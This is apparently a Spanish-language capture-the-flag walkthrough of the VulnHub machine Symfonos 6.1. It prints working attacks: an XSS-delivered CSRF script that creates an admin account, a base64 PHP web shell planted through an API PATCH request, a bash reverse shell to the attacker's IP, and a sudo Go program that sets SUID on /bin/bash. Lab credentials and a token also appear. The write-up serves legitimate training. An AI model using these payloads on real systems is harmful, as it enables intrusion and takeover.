
---
- Tags:  #vulhub #Symfonos
---

- **Máquina Symfonos 6.1**: [https://www.vulnhub.com/entry/symfonos-61,458/](https://www.vulnhub.com/entry/symfonos-61,458/)

## Reconocimiento:

En este caso la máquina ya nos da su dirección ip con lo cuál no haría falta un arp-scan, pero se puede hacer para asegurar.
### Ping
```
ping -c 1 192.168.18.238
```

### Nmap

Ejecutamos el comando como administrador.
Descubrimos los puertos abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.237 -oG allPorts
```

Una vez descubiertos los puertos, ejecutamos una serie de scripts sobre los puertos. *En este caso: 22,80,3000,3306,5000*

```bash
nmap -sC -sV -p22,80,3000,3306,5000 192.168.18.238 -oN Targgeted
```
La máquina tiene un ssh inferior al 7.7 con lo cuál puede ser vulnerable a un *ssh user enumeration*

```bash
nmap --script http-enum -p22,80,3000,3306,5000 192.168.18.238 -oN webScan 
```
Abrimos el navegador para comprobar el contenido, no encontramos gran cosa, como nmap tampoco me ha reportado mucho.
En los demás puertos encontramos otras cosas útiles, en la web del puesto 3000 encontramos un *gitea* con 2 usuarios, que es parecido a un github. En el puerto 5000 encontramos una posible API. 

Vamos a usar gobuster y un diccionario para ver si encontramos algo.
```bash
gobuster dir -u http://192.168.18.238/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```
Encontramos el directorio */posts* con un posible usuario Achilles, para probarlo nos traemos al repositorio el .py de searchsploit. (*Es necesario ejecutar el .py con python2.7 y yo no lo tenia instalado, con lo que pase casi una hora instalando el python y el openssl que al parecer es indispensable. Esto sumado a que tampoco tenía los diccionarios de la seclist instalados para hacer el gobuster, ya suman casi 3 horas frente al ordenador solo en la fase de reconocimiento. Después de instalar todo aún faltaba instalar paramiko.*)

```python
python2.7 45939.py 192.168.18.238 achilles 2>/dev/null
```
El usuario es válido y podríamos intentar encontrar credenciales válidas con hidra pero no encontrariamos nada.
Con el medium no encontramos nada asi que vamos aprobar con el big.
```bash
gobuster dir -u http://192.168.18.238/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20
```
Encontramos otro directorio mas */flyspray* , si la buscamos en searchsploit encontramos varias vulnerabilidades, sin embargo no sabemos cuál es la versión. Flyspray es un proyecto opensource asi que podemos ver todo el proyecto en github para encontrar donde se guardan archivos como *chagelog.txt* y encontramos en http://192.168.18.238/flyspray/docs/UPGRADING.txt la versión 1.0
y en searchsploit un CSRF para esa misma versión.

Para ejecutar el exploit lo que hay que hacer es crear un usuario y meternos, en la parte de realname como prueba podemos poner un *"><script>alert("XSS")</script>* y vemos que si funciona, asi que forzamos a que cargue un recurso externo e interprete un JavaScript. ("><script src="http://192.168.18.226/pwned.js"</script>) y este es el script:
```java
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();

```
Este script nos debería crear un usuario llamado hacker con contraseña 12345678.
Entramos y encontramos las credenciales para *Achilles:h2sBr9gryBunKdF9* para conectarnos con ssh o deberíamos tener la clave privada o mi clave deberia estar en allowed keys. Así que probamos en Gitea y podemos ver sus proyectos privados.
Donde tiene credenciales expuestas en */symfonos-blog* pero para el sql de mariadb necesito además de las credenciales necesitamos ser un host autorizado.

Cotilleando un poco sus proyectos podemos ver el *index.php* en raw, con un *preg_replace* con el parámetro *e* que ya no tiene soporte en porque a la cadena correspondiente le puedes inyectar código php.

Hay otro proyecto tambien llamado *symfonos-api* que parece ser la api que está corriendo en el puerto 5000. Después de probar varias cosas, deducimos por el contenido del proyecto que podemos mandarle un curl a la api con las credenciales de achilles que tenemos 
```bash
curl -s -X POST "http://192.168.18.238:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}' | jq
```
Con esto, obtendremos el *jsonwebToken:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTA3ODM0ODEsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.SmA8pt_2TcKscZHbk-cLJhQ0niYuOwifrFkmObOFp4w* pero no tenemos el secreto por lo cual no lo podemos alterar.
Todo apunta a que tendremos que abusar de una API mediante el método PATCH especificando el id y arrastrando el TOKEN de sessión de achilles.
```bash
curl -s -X PATCH "http://192.168.18.238:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTA3ODM0ODEsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.SmA8pt_2TcKscZHbk-cLJhQ0niYuOwifrFkmObOFp4w' -d $'{"text": "file_put_contents(\'cmd.php\', base64_decode(\'PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\'))"}' 
```
En este comando lo que tenemos es:
- Método *PATCH* que encontramos en el proyecto de gitea, que se usaba para hacer updates.
- La *URL* de la API con el tipo de contenido que acepta.
- El *json.webTOKEN* del usuario achilles, porque no cualquier usuario puede tramitar peticiones a la API
- Por último, para establecernos una reverse shell, ya que tenemos capacidad remota de comandos, usamos las herramientas de php en este caso, porque las comillas simples y dobles podrían no interpretarse si lo hacemos en bash, utilizamos un *file_put_contents* que crea un archivo y coloca lo que tu le señales dentro. De nuevo como algunos caracteres especiales podrían dar problemas, lo que hacemos es crear un archivo data que contiene el típico script de cmd desde la url y lo pasamos a base64.
```php
<?php
	system($_GET['cmd']);
?>
```

```bash
base64 -w 0 data; echo
```
Como con este comando nos creamos un archivo *cmd.php* y tenemos capacidad remota de comandos, nos ponemos en escucha con netcat por el 443 desde la máquina atacante y nos mandamos una shell por la url.
```url
http://192.168.18.238/posts/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.18.226/443 0>%261"
```

y aplicamos un tratamiento de la tty:
```bash
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash
stty rows 44 columns 184

```
estamos dentro de la máquina solo falta elevar nuestros privilegios, pero ahora que estamos dentro podemos usar el servicio SSH. Nos conectamos como el usuario Achilles con la contraseña anterior. Y vamos a primero borrar claves de ssh antiguas en la máquina atacante, después creamos nuevas claves ssh y las cambiamos en la máquina víctima.

```bash
rm ~/.ssh/*
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub | xclip -sel clip
```
Sustituimos las claves en la máquina víctima.
```shell
rm authorized_keys
vi authorized_keys
chmod 600 authorized_keys
```

Y nos conectamos por ssh siendo achilles con: *ssh achilles@192.168.18.238* es importante poner *yes*.
Hacemos un *sudo -l* y tenemos un archivo NOPASSWD en Go. Vamos a crear un archivo.go para darnos una bash:
```Go
package main

import (
    "log"
    "os/exec"
)

func main() {

    cmd := exec.Command("chmod", "u+s", "/bin/bash")

    err := cmd.Run()

    if err != nil {
        log.Fatal(err)
    }
}
```
Ejecutamos el siguiente comando y después una *bash -p* y ya estaría.
```bash
sudo /usr/local/go/bin/go run example.go
```

![[Pasted image 20260923191706.png]]